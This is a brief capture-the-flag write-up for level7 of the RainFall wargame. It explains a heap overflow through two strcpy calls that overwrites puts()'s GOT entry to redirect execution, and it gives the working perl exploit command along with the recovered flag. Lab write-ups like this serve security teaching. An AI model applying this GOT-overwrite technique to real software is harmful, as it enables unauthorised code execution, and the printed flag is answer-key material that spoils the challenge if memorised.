After reversing level7 we see all malloc calls returns consecutive
addresses with 16 bytes between each of them.

Using the first strcpy we can overflow the "ptr" from 'a' struct to
modify the address of "ptr" from 'b' struct. And with the second strcpy
we can rewrite the address where b->ptr is pointing.

When disasssembling puts() we can see a jump to *0x8049928 as RELRO is disabled
we can rewrite the address it points to, to jump to m() [0x80484f4]

level7@RainFall:~$ ./level7 `perl -e 'print "A"x20 . "\x28\x99\x04\x08"'` `perl -e 'print "\xf4\x84\x04\x08"'`
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1629620878
